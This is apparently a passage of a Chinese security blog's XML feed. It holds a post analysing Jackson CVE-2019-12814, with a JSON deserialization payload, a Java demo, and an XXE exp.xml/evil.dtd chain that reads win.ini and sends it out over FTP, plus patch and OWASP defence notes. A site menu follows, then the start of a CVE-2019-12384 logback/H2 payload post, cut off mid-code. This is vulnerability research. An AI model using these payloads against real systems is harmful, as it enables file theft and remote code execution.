    
    <summary type="html">
    
      已完结.
    
    </summary>
    
      <category term="Java" scheme="https://www.mi1k7ea.com/categories/Java/"/>
    
    
      <category term="Web安全" scheme="https://www.mi1k7ea.com/tags/Web%E5%AE%89%E5%85%A8/"/>
    
      <category term="Java" scheme="https://www.mi1k7ea.com/tags/Java/"/>
    
  </entry>
  
  <entry>
    <title>Jackson系列六——CVE-2019-12814（基于JDOM XSLTransformer利用链）</title>
    <link href="https://www.mi1k7ea.com/2019/11/24/Jackson%E7%B3%BB%E5%88%97%E5%85%AD%E2%80%94%E2%80%94CVE-2019-12814%EF%BC%88%E5%9F%BA%E4%BA%8EJDOM-XSLTransformer%E5%88%A9%E7%94%A8%E9%93%BE%EF%BC%89/"/>
    <id>https://www.mi1k7ea.com/2019/11/24/Jackson系列六——CVE-2019-12814（基于JDOM-XSLTransformer利用链）/</id>
    <published>2019-11-24T09:08:45.000Z</published>
    <updated>2019-11-24T10:11:34.904Z</updated>
    
    <content type="html"><![CDATA[<p>该CVE其实是反序列化XXE导致的任意文件读取漏洞，这里简单复现分析下这条利用链。</p><h2 id="0x01-影响版本"><a href="#0x01-影响版本" class="headerlink" title="0x01 影响版本"></a>0x01 影响版本</h2><p>Jackson 2.x系列 &lt;2.9.9.1</p><h2 id="0x02-限制"><a href="#0x02-限制" class="headerlink" title="0x02 限制"></a>0x02 限制</h2><p>需要 JDOM 1.x 或 JDOM 2.x 的依赖支持。</p><h2 id="0x03-复现利用"><a href="#0x03-复现利用" class="headerlink" title="0x03 复现利用"></a>0x03 复现利用</h2><p>需要的jar：jackson-annotations-2.9.9，jackson-core-2.9.9，jackson-databind-2.9.9，jdom2-2.0.6。</p><p>关键PoC：</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[<span class="string">"org.jdom2.transform.XSLTransformer"</span>, <span class="string">"http://127.0.0.1/exp.xml"</span>]</span><br></pre></td></tr></table></figure><p>完整Demo：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">PoC</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span>  </span>&#123;</span><br><span class="line">        String payload = <span class="string">"[\"org.jdom2.transform.XSLTransformer\", \"http://127.0.0.1/exp.xml\"]"</span>;</span><br><span class="line">        ObjectMapper mapper = <span class="keyword">new</span> ObjectMapper();</span><br><span class="line">        mapper.enableDefaultTyping();</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Object object = mapper.readValue(payload, Object.class);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>接着就是XXE的FTP外带数据的参数实体解析攻击了。</p><p>exp.xml：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE ANY[</span><br><span class="line">&lt;!ENTITY % file SYSTEM &quot;file:///c:/windows/win.ini&quot;&gt;</span><br><span class="line">&lt;!ENTITY % remote SYSTEM &quot;http://127.0.0.1/xxe/evil.dtd&quot;&gt;</span><br><span class="line">%remote;</span><br><span class="line">%send;</span><br><span class="line">]&gt;</span><br></pre></td></tr></table></figure><p>evil.dtd：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY % all &quot;&lt;!ENTITY &amp;#37; send SYSTEM &apos;ftp://127.0.0.1:21/%file;&apos;&gt;&quot;&gt; %all;</span><br></pre></td></tr></table></figure><p>开启Web服务放置exp.xml和evil.dtd，再开启FTP服务进行监听接受数据。</p><p>运行，FTP服务端即可接收到目标文件内容：</p><p><img src="/2019/11/24/Jackson系列六——CVE-2019-12814（基于JDOM-XSLTransformer利用链）/1.png" alt=""></p><h2 id="0x04-调试分析"><a href="#0x04-调试分析" class="headerlink" title="0x04 调试分析"></a>0x04 调试分析</h2><p>前面的解析过程和之前分析的反序列化过程几乎是一样的，我们直接在newInstance()新建的实例中看到，调用到XSLTransformer类的构造函数，其中调用了newTemplates()方法来新建模板：</p><p><img src="/2019/11/24/Jackson系列六——CVE-2019-12814（基于JDOM-XSLTransformer利用链）/2.png" alt=""></p><p>跟进newTemplates()方法，其中调用了XSLTC.compile()方法对输入参数内容进行解析：</p><p><img src="/2019/11/24/Jackson系列六——CVE-2019-12814（基于JDOM-XSLTransformer利用链）/3.png" alt=""></p><p>跟下去，发现调用parse()函数来解析根节点的抽象语法树：</p><p><img src="/2019/11/24/Jackson系列六——CVE-2019-12814（基于JDOM-XSLTransformer利用链）/4.png" alt=""></p><p>再跟进去看看，就是调用Parser.parse()解析XML，且调用的setFeature()设置的并不是XXE的有效防御设置，导致XXE漏洞的存在：</p><p><img src="/2019/11/24/Jackson系列六——CVE-2019-12814（基于JDOM-XSLTransformer利用链）/5.png" alt=""></p><p><img src="/2019/11/24/Jackson系列六——CVE-2019-12814（基于JDOM-XSLTransformer利用链）/6.png" alt=""></p><p>再往下，就是调用SAXParser.parse()函数来解析该XML内容了，就是XXE的触发的地方。</p><p>值得一提的是，OWASP推荐的防御XXE的setFeature()要设置下面几个值：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">factory.setFeature(<span class="string">"http://apache.org/xml/features/disallow-doctype-decl"</span>, <span class="keyword">true</span>);</span><br><span class="line">factory.setFeature(<span class="string">"http://xml.org/sax/features/external-general-entities"</span>, <span class="keyword">false</span>);</span><br><span class="line">factory.setFeature(<span class="string">"http://xml.org/sax/features/external-parameter-entities"</span>, <span class="keyword">false</span>);</span><br><span class="line">factory.setFeature(<span class="string">"http://apache.org/xml/features/nonvalidating/load-external-dtd"</span>, <span class="keyword">false</span>);</span><br></pre></td></tr></table></figure><p>很明显看到，前面漏洞代码中setFeature()设置的并非前面的防御设置，因此并不能防御XXE：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> String NAMESPACE_FEATURE =    <span class="string">"http://xml.org/sax/features/namespaces"</span>;</span><br></pre></td></tr></table></figure><h2 id="0x05-补丁分析"><a href="#0x05-补丁分析" class="headerlink" title="0x05 补丁分析"></a>0x05 补丁分析</h2><p>Jackson在2.9.9.1版本中添加了该JDOM类的黑名单，具体的可在jackson-databind-2.9.9.1-sources.jar!/com/fasterxml/jackson/databind/jsontype/impl/SubTypeValidator.java中看到：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// [databind#2341]: jdom/jdom2 (2.9.9.1)</span></span><br><span class="line">s.add(<span class="string">"org.jdom.transform.XSLTransformer"</span>);</span><br><span class="line">s.add(<span class="string">"org.jdom2.transform.XSLTransformer"</span>);</span><br></pre></td></tr></table></figure><h2 id="0x06-参考"><a href="#0x06-参考" class="headerlink" title="0x06 参考"></a>0x06 参考</h2><p><a href="https://bithack.io/forum/463" target="_blank" rel="noopener">Java 反序列化漏洞始末（4）— jackson</a></p>]]></content>
    
    <summary type="html">
    
      已完结.
    
    </summary>
    
      <category term="Java" scheme="https://www.mi1k7ea.com/categories/Java/"/>
    
    
      <category term="Web安全" scheme="https://www.mi1k7ea.com/tags/Web%E5%AE%89%E5%85%A8/"/>
    
      <category term="Java" scheme="https://www.mi1k7ea.com/tags/Java/"/>
    
  </entry>
  
  <entry>
    <title>个人Wiki系统</title>
    <link href="https://www.mi1k7ea.com/2019/11/22/home/"/>
    <id>https://www.mi1k7ea.com/2019/11/22/home/</id>
    <published>2019-11-22T13:32:01.396Z</published>
    <updated>2019-11-27T14:52:54.813Z</updated>
    
    <content type="html"><![CDATA[<hr><pre> __  __ _ _ _    _____          _      __        ___ _    _ |  \/  (_) | | _|___  |__  __ _( )___  \ \      / (_) | _(_)| |\/| | | | |/ /  / / _ \/ _` |// __|  \ \ /\ / /| | |/ / || |  | | | |   <  / /  __/ (_| | \__ \   \ V  V / | |   <| |<br="">|_|  |_|_|_|_|\_\/_/ \___|\__,_| |___/    \_/\_/  |_|_|\_\_|</|></pre><hr><p><strong>Email：</strong>6d69316b376561403136332e636f6d</p><hr><p><strong>Note：</strong>本站改为个人Wiki系统，将之前写的博客、知识笔记都系统归纳起来，同时会转载一些网上的总结笔记，目的在于构建知识库、以便于个人的查阅。</p><hr>]]></content>
    
    <summary type="html">
    
      
      
        &lt;hr&gt;
&lt;pre&gt;
 __  __ _ _ _    _____          _      __        ___ _    _ 
|  \/  (_) | | _|___  |__  __ _( )___  \ \      / (_) | _(_)
| |\/| 
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title></title>
    <link href="https://www.mi1k7ea.com/2019/11/22/menu/"/>
    <id>https://www.mi1k7ea.com/2019/11/22/menu/</id>
    <published>2019-11-22T13:30:57.172Z</published>
    <updated>2019-11-27T15:24:57.977Z</updated>
    
    <content type="html"><![CDATA[<ul><li><strong>Web安全</strong><ul><li>Web安全基础&amp;Tricks<ul><li><a href="/2019/10/14/文件上传漏洞总结/">文件上传攻击框架</a></li><li><a href="/2019/10/04/CSWSH漏洞总结/">CSWSH漏洞总结</a></li><li><a href="/2019/09/28/SSI注入漏洞总结/">SSI注入漏洞总结</a></li><li><a href="/2019/08/20/JSONP跨域漏洞总结/">JSONP跨域漏洞总结</a></li><li><a href="/2019/08/18/CORS跨域漏洞总结/">CORS跨域漏洞总结</a></li><li><a href="/2019/08/18/利用HTML注入劫持标签Bypass-CSP/">利用HTML注入劫持标签Bypass CSP</a></li><li><a href="/2019/08/11/NoSQL注入之MongoDB/">NoSQL注入之MongoDB</a></li><li><a href="/2019/08/10/Flash安全总结/">Flash安全总结</a></li><li><a href="/2019/08/05/利用Flash进行Json-CSRF攻击/">利用Flash进行Json CSRF攻击</a></li><li><a href="/2019/07/31/SWFUpload-swf的Flash型XSS分析/">SWFUpload.swf的Flash型XSS分析</a></li><li><a href="/2019/07/30/ZeroClipboard-swf的Flash型XSS分析/">ZeroClipboard.swf的Flash型XSS分析</a></li><li><a href="/2019/07/28/Flash型CSRF总结/">Flash型CSRF总结</a></li><li><a href="/2019/07/21/Flash型XSS小结/">Flash型XSS总结</a></li><li><a href="/2019/06/30/XSS从弹框到RCE/">XSS从弹框到RCE（IE）</a></li><li><a href="/2019/06/30/命令注入Bypass技巧小结/">命令注入Bypass技巧小结</a></li><li><a href="/2019/06/25/浅析DOM型XSS/">浅析DOM型XSS</a></li><li><a href="/2019/03/22/图片XSS小结/">图片XSS小结</a></li><li><a href="/2019/02/24/CSP策略及绕过技巧小结/">CSP策略及绕过技巧小结</a></li><li><a href="/2019/02/19/一些加载XSS-Payload的标签/">一些加载XSS Payload的标签</a></li><li><a href="/2019/02/16/个人XSS-payload收集/">个人XSS payload收集</a></li><li><a href="/2019/01/30/常见Web漏洞类型/">常见Web漏洞类型总结</a></li><li><a href="/2019/01/01/Sqli-labs-writeup/">Sqli-labs Less1-20</a></li><li><a href="/2019/01/01/SQL注入写WebShell方式小结/">SQL注入写WebShell方式小结</a></li></ul></li><li>Web安全之机器学习</li><li>WriteUp Web<ul><li><a href="/2019/10/20/InCTF-2019-PHP三题复现/">InCTF 2019 PHP+1,+1.5,+2.5三题复现</a></li><li><a href="/2019/10/05/upload-labs-WriteUp/">Upload-Labs WriteUp</a></li><li><a href="/2019/09/28/bWAPP之Cross-Origin-Resource-Sharing-AJAX/">bWAPP之Cross-Origin Resource Sharing (AJAX)</a></li><li><a href="/2019/07/02/DVWA之JavaScript攻击/">DVWA之JavaScript攻击</a></li><li><a href="/2019/06/27/一道Bypass正则过滤的反序列化漏洞题目/">一道Bypass正则过滤的反序列化漏洞题目</a></li><li><a href="/2019/06/27/从一道CTF题看如何利用本地DTD文件实现XXE攻击/">从一道CTF题看如何通过本地DTD文件利用XXE实现回显</a></li><li><a href="/2019/03/31/0CTF-Web-writeup/">0CTF Web writeup</a></li><li><a href="/2019/03/29/Securinets-CTF-Web-writeup/">Securinets CTF Web writeup</a></li><li><a href="/2019/03/21/Teaser-CONFidence-CTF-Web-writeup/">Teaser CONFidence CTF Web writeup</a></li><li><a href="/2019/03/17/SpEL注入之javacon/">SpEL注入之javacon</a></li><li><a href="/2019/03/13/AeroCTF-writeupup之board-tracking-system/">AeroCTF writeupup之board tracking system</a></li><li><a href="/2019/03/09/TAMUctf-Web-writeup/">TAMUctf Web writeup</a></li><li><a href="/2019/02/21/一道绕过CSP的XSS题目/">一道绕过CSP的XSS题目</a></li><li><a href="/2019/02/15/XSS闯关之xss-haozi-me/">XSS闯关之xss.haozi.me</a></li><li><a href="/2019/01/01/通过DVWA学习DOM型XSS/">DVWA之DOM型XSS</a></li></ul></li></ul></li><li><strong>Java</strong><ul><li>Java安全<ul><li><a href="/2019/09/15/浅析JNDI注入/">浅析JNDI注入</a></li><li><a href="/2019/09/01/Java-RMI原理与使用/">Java RMI原理与使用</a></li><li><a href="/2019/06/09/探讨XXE防御之setFeature设置/">探讨XXE防御之setFeature设置</a></li><li><a href="/2019/05/26/XML注入之SAXBuilder/">XML注入之SAXBuilder</a></li><li><a href="/2019/05/26/XML注入之SAXParser/">XML注入之SAXParser</a></li><li><a href="/2019/05/24/XML注入之SAXReader/">XML注入之SAXReader</a></li><li><a href="/2019/02/13/XML注入之DocumentBuilder/">XML注入之DocumentBuilder与XXE攻击防御</a></li><li><a href="/2019/02/01/Java动态代理机制/">Java动态代理机制</a></li><li><a href="/2019/02/01/Java反射机制/">Java反射机制</a></li><li><a href="/2019/02/03/Java序列化和反序列化机制/">Java序列化和反序列化机制</a></li><li><a href="/2019/02/06/Java反序列化漏洞/">Java反序列化漏洞</a></li><li><a href="/2019/01/01/XMLDecoder反序列化漏洞/">Java XMLDecoder反序列化漏洞</a></li><li><a href="/2019/10/21/XStream反序列化漏洞/">Java XStream反序列化漏洞</a></li><li><a href="/2019/11/13/Fastjson系列五——高版本JDK绕过及检测与防御/">Fastjson系列五——高版本JDK绕过及检测与防御</a></li><li><a href="/2019/11/11/Fastjson系列四——1-2-25-1-2-47反序列化漏洞（无需开启AutoType）/">Fastjson系列四——1.2.25-1.2.47反序列化漏洞（无需开启AutoType）</a></li><li><a href="/2019/11/10/Fastjson系列三——历史版本补丁绕过（需开启AutoType）/">Fastjson系列三——历史版本补丁绕过（需开启AutoType）</a></li><li><a href="/2019/11/07/Fastjson系列二——1-2-22-1-2-24反序列化漏洞/">Fastjson系列二——1.2.22-1.2.24反序列化漏洞</a></li><li><a href="/2019/11/03/Fastjson系列一——反序列化漏洞基本原理/">Fastjson系列一——反序列化漏洞基本原理</a></li><li><a href="/2019/11/24/Jackson系列七——其他Gadgets/">Jackson系列七——其他Gadgets与检测防御</a></li><li><a href="/2019/11/24/Jackson系列六——CVE-2019-12814（基于JDOM-XSLTransformer利用链）/">Jackson系列六——CVE-2019-12814（基于JDOM XSLTransformer利用链）</a></li><li><a href="/2019/11/22/Jackson系列五——CVE-2019-12384（基于logback利用链）/">Jackson系列五——CVE-2019-12384（基于logback利用链）</a></li><li><a href="/2019/11/19/Jackson系列四——CVE-2019-12086（基于MiniAdmin利用链）/">Jackson系列四——CVE-2019-12086（基于MiniAdmin利用链）</a></li><li><a href="/2019/11/17/Jackson系列三—CVE-2017-1748（基于ClassPathXmlApplicationContext利用链）/">Jackson系列三——CVE-2017-17485（基于ClassPathXmlApplicationContext利用链）</a></li><li><a href="/2019/11/16/Jackson系列二——CVE-2017-7525（基于TemplatesImpl利用链）/">Jackson系列二——CVE-2017-7525（基于TemplatesImpl利用链）</a></li><li><a href="/2019/11/13/Jackson系列一——反序列化漏洞基本原理/">Jackson系列一——反序列化漏洞基本原理</a></li><li><a href="/2019/11/25/（转）Java代码审计指南">（转）Java代码审计指南</a></li><li><a href="/2019/11/25/（转）Java项目中常见jar包的说明">（转）Java项目中常见jar包的说明</a></li></ul></li><li>Struts2</li><li>Spring<ul><li><a href="/2019/09/02/由JNDI注入导致的Spring-Framework反序列化漏洞/">由JNDI注入引发的Spring Framework反序列化漏洞</a></li><li><a href="/2019/04/05/Spring-Data-Rest之cve-2017-8046分析/">浅析Spring Data Rest之cve-2017-8046</a></li></ul></li><li>SpringCloud</li></ul></li><li><strong>PHP</strong><ul><li>PHP安全<ul><li><a href="/2019/08/25/浅谈PHP-FPM安全/">浅谈PHP-FPM安全</a></li><li><a href="/2019/08/03/从蚁剑插件看利用PHP-FPM绕过disable-functions/">从蚁剑插件看利用PHP-FPM绕过disable_functions</a></li><li><a href="/2019/07/20/浅谈几种Bypass-open-basedir的方法/">浅谈几种Bypass open_basedir的方法</a></li><li><a href="/2019/07/16/PHP中mail-函数安全问题与防御/">PHP中mail()函数安全问题与防御</a></li><li><a href="/2019/07/04/浅谈escapeshellarg与参数注入/">浅谈escapeshellarg逃逸与参数注入</a></li><li><a href="/2019/07/02/浅析preg-replace与preg-match/">浅析preg_replace与preg_match</a></li><li><a href="/2019/06/21/PHP弱类型小结/">PHP弱类型及相关函数Bypass小结</a></li><li><a href="/2019/06/20/PHP变量覆盖漏洞/">PHP变量覆盖漏洞小结</a></li><li><a href="/2019/06/09/巧用get-defined-functions隐藏WebShell/">巧用get_defined_functions隐藏WebShell</a></li><li><a href="/2019/06/07/从一道题看PHP7-4的FFI绕过disable-functions/">从RCTF nextphp看PHP7.4的FFI绕过disable_functions</a></li><li><a href="/2019/06/02/浅谈几种Bypass-disable-functions的方法/">浅谈几种Bypass disable_functions的方法</a></li><li><a href="/2019/05/04/PHP对象注入之pop链构造/">PHP对象注入之pop链构造</a></li><li><a href="/2019/04/21/PHP-session反序列化漏洞/">PHP session反序列化漏洞</a></li><li><a href="/2019/01/31/PHP伪协议/">PHP伪协议</a></li><li><a href="/2019/01/01/phar反序列化漏洞/">phar反序列化漏洞</a></li><li><a href="/2019/01/01/Windows下的一种PHP隐蔽后门姿势/">Windows下的一种PHP隐藏后门姿势</a></li><li><a href="/2019/01/01/PHP反序列化漏洞/">PHP unserialize反序列化漏洞</a></li><li><a href="/2019/01/01/PHP内存型木马/">PHP内存型木马</a></li></ul></li><li>CMS</li></ul></li><li><strong>Python</strong><ul><li>Python安全<ul><li><a href="/2019/06/02/浅析Python-Flask-SSTI/">浅析Python Flask SSTI</a></li><li><a href="/2019/05/31/Python沙箱逃逸小结/">Python沙箱逃逸小结</a></li><li><a href="/2019/01/01/PyYAML反序列化漏洞/">Python PyYAML反序列化漏洞</a></li><li><a href="/2019/01/01/cPickle反序列化漏洞/">Python cPickle反序列化漏洞</a></li></ul></li><li>安全开发<ul><li><a href="/2019/06/30/AWD文件监控脚本/">AWD文件监控脚本</a></li><li><a href="/2019/01/01/Python安全小工具之反编译pyc文件/">Python安全小工具之反编译pyc文件</a></li></ul></li><li>爬虫</li><li>Django</li></ul></li><li><strong>JavaScript</strong><ul><li>JavaScript安全<ul><li><a href="/2019/10/20/浅析JavaScript原型链污染攻击/">浅析JavaScript原型链污染攻击</a></li></ul></li><li>NodeJS</li><li>AngularJS</li></ul></li><li><strong>GO</strong><ul><li>GO安全</li></ul></li><li><strong>二进制安全</strong><ul><li>二进制基础<ul><li><a href="/2019/05/24/GOT表-PLT表与动态链接/">ELF动态链接,PLT和GOT</a></li><li><a href="/2019/04/27/堆基础/">堆基础</a></li><li><a href="/2019/04/15/ELF二进制格式/">ELF二进制格式</a></li><li><a href="/2019/03/03/栈及栈帧/">栈基础</a></li><li><a href="/2019/02/09/ELF安全防御机制小结/">ELF安全防御机制小结</a></li><li><a href="/2019/01/28/IA-32寄存器/">IA-32（Intel Architecture 32位）寄存器</a></li><li><a href="/2019/01/01/Linux环境与相关工具/">Linux环境与相关工具</a></li></ul></li><li>C/C++<ul><li><a href="/2019/03/24/C编写实现Linux反弹shell/">C编写实现Linux反弹shell</a></li></ul></li><li>逆向工程</li><li>Fuzzing</li><li>Pwn<ul><li><a href="/2019/04/20/花式栈溢出之stack-pivoting/">花式栈溢出之stack pivoting</a></li><li><a href="/2019/04/12/中级ROP之ret2csu/">栈溢出之ret2csu</a></li><li><a href="/2019/04/09/蒸米ROP学习笔记/">蒸米32位及64位ROP笔记</a></li><li><a href="/2019/04/07/pwntools笔记/">pwntools笔记</a></li><li><a href="/2019/03/23/花式栈溢出之Stack-smash/">花式栈溢出之Stack smash</a></li><li><a href="/2019/03/05/栈溢出之ret2libc/">栈溢出之ret2libc</a></li><li><a href="/2019/03/03/栈溢出之ret2syscall/">栈溢出之ret2syscall</a></li><li><a href="/2019/03/03/栈溢出之ret2shellcode/">栈溢出之ret2shellcode</a></li><li><a href="/2019/03/03/ROP之ret2text/">ROP基础及栈溢出之ret2text</a></li><li><a href="/2019/03/03/栈溢出基本原理/">栈溢出基本原理</a></li></ul></li><li>WriteUp Pwn<ul><li><a href="/2019/03/08/TAMUctf-Pwn-writeup/">TAMUctf Pwn writeup</a></li></ul></li><li>WriteUp Reverse<ul><li><a href="/2019/01/01/HITB_Binary_100_writeup/">HITB Binary 100 writeup</a></li></ul></li></ul></li><li><strong>渗透测试</strong><ul><li>基础&amp;Tricks</li><li>Kali</li><li>Metasploit</li><li>内网渗透</li><li>提权<ul><li><a href="/2019/11/27/关于本地提权的学习笔记（一）：Administrator提权到System">关于本地提权的学习笔记（一）：Administrator提权到System</a></li></ul></li><li>免杀</li><li>工具</li></ul></li><li><strong>OS</strong><ul><li>Windows</li><li>Linux</li></ul></li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;ul&gt;
&lt;li&gt;&lt;strong&gt;Web安全&lt;/strong&gt;&lt;ul&gt;
&lt;li&gt;Web安全基础&amp;amp;Tricks&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;/2019/10/14/文件上传漏洞总结/&quot;&gt;文件上传攻击框架&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;/2019/10/0
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>Jackson系列五——CVE-2019-12384（基于logback利用链）</title>
    <link href="https://www.mi1k7ea.com/2019/11/22/Jackson%E7%B3%BB%E5%88%97%E4%BA%94%E2%80%94%E2%80%94CVE-2019-12384%EF%BC%88%E5%9F%BA%E4%BA%8Elogback%E5%88%A9%E7%94%A8%E9%93%BE%EF%BC%89/"/>
    <id>https://www.mi1k7ea.com/2019/11/22/Jackson系列五——CVE-2019-12384（基于logback利用链）/</id>
    <published>2019-11-22T12:52:46.000Z</published>
    <updated>2019-11-24T09:20:25.599Z</updated>
    
    <content type="html"><![CDATA[<p>本次CVE是基于logback的利用链的。</p><h2 id="0x01-影响版本"><a href="#0x01-影响版本" class="headerlink" title="0x01 影响版本"></a>0x01 影响版本</h2><p>Jackson 2.x系列 &lt;2.9.9.1</p><h2 id="0x02-限制"><a href="#0x02-限制" class="headerlink" title="0x02 限制"></a>0x02 限制</h2><p>需要logback和H2数据库的依赖，但是用H2嵌入式数据库的场景很少见。</p><h2 id="0x03-H2特性——用户自定义函数"><a href="#0x03-H2特性——用户自定义函数" class="headerlink" title="0x03 H2特性——用户自定义函数"></a>0x03 H2特性——用户自定义函数</h2><p>H2数据库，是Java实现的内存数据库，可作为嵌入式内存数据库，提供用户自定义数据库函数以及在数据库中注册函数的功能。</p><p>下面看看用户如何来自定义H2数据库函数的。</p><p>现在假设我们需要在H2数据库中实现Oracle的”TO_DATE”函数，那么需要的过程是这样的：</p><ol><li>使用Java实现自定义函数的方法；</li><li>将Java的自定义函数注册到H2数据库中；</li></ol><p>首先我们自定义这个函数：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.seraph.bi.suite.support.h2;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.text.SimpleDateFormat;</span><br><span class="line"><span class="keyword">import</span> org.h2.tools.SimpleResultSet; </span><br><span class="line">... </span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Function</span> </span>&#123;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> java.sql.<span class="function">Date <span class="title">to_date</span><span class="params">(String source, String format)</span> <span class="keyword">throws</span> ParseException </span>&#123;</span><br><span class="line"><span class="comment">// <span class="doctag">TODO:</span> 'YYYY-MM-DD' ? Oracle format?</span></span><br><span class="line">SimpleDateFormat sdf = <span class="keyword">new</span> SimpleDateFormat(<span class="string">"yyyy-MM-dd"</span>);</span><br><span class="line">java.util.Date date = sdf.parse(source);</span><br><span class="line"><span class="keyword">return</span> <span class="keyword">new</span> java.sql.Date(date.getTime());</span><br><span class="line">&#125;</span><br><span class="line">...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p> 以上代码段是TO_DATE的实现，但用户自定义的函数需注意的是：类和方法必须是公共（Public）的，且方法需为静态（static）的，如方法中使用了Connection对象需将其关闭。</p><p>第二步，我们将其注册到数据库中，执行<code>CREATE ALIAS</code>语句：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">CREATE</span> <span class="keyword">ALIAS</span> [<span class="keyword">IF</span> <span class="keyword">NOT</span> <span class="keyword">EXISTS</span>] newFunctionAliasName [<span class="keyword">DETERMINISTIC</span>] <span class="keyword">FOR</span> classAndMethodName</span><br></pre></td></tr></table></figure><p>本例的语句为：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">CREATE</span> <span class="keyword">ALIAS</span> <span class="keyword">TO_DATE</span> <span class="keyword">FOR</span> <span class="string">"com.seraph.bi.suite.support.h2.Function.to_date"</span>;</span><br></pre></td></tr></table></figure><p>之后，再执行类似如下语句，函数TO_DATE即可被解析了：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="keyword">to_date</span>(<span class="string">'2009-1-21'</span>,<span class="string">'YYYY-MM-DD'</span>) <span class="keyword">from</span> Your_Table;</span><br></pre></td></tr></table></figure><h2 id="0x04-复现利用"><a href="#0x04-复现利用" class="headerlink" title="0x04 复现利用"></a>0x04 复现利用</h2><p>需要的jar包如下：</p><ul><li><a href="http://central.maven.org/maven2/com/fasterxml/jackson/core/jackson-databind/2.9.8/jackson-databind-2.9.8.jar" target="_blank" rel="noopener">jackson-databind-2.9.8</a></li><li><a href="http://central.maven.org/maven2/com/fasterxml/jackson/core/jackson-annotations/2.9.8/jackson-annotations-2.9.8.jar" target="_blank" rel="noopener">jackson-annotations-2.9.8</a></li><li><a href="http://central.maven.org/maven2/com/fasterxml/jackson/core/jackson-core/2.9.8/jackson-core-2.9.8.jar" target="_blank" rel="noopener">jackson-core-2.9.8</a></li><li><a href="http://central.maven.org/maven2/ch/qos/logback/logback-core/1.3.0-alpha4/logback-core-1.3.0-alpha4.jar" target="_blank" rel="noopener">logback-core-1.3.0-alpha4</a></li><li><a href="http://central.maven.org/maven2/com/h2database/h2/1.4.199/h2-1.4.199.jar" target="_blank" rel="noopener">h2-1.4.199</a></li></ul><p>关键PoC：</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[<span class="string">"ch.qos.logback.core.db.DriverManagerConnectionSource"</span>, &#123;<span class="attr">"url"</span>:<span class="string">"jdbc:h2:mem:;TRACE_LEVEL_SYSTEM_OUT=3;INIT=RUNSCRIPT FROM 'http://localhost:8000/inject.sql'"</span>&#125;]</span><br></pre></td></tr></table></figure><p>以下Demo，先尝试向目标服务器发起请求：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">PoC</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span>  </span>&#123;</span><br><span class="line">        String payload = <span class="string">"[\"ch.qos.logback.core.db.DriverManagerConnectionSource\", &#123;\"url\":\"jdbc:h2:mem:;TRACE_LEVEL_SYSTEM_OUT=3;INIT=RUNSCRIPT FROM 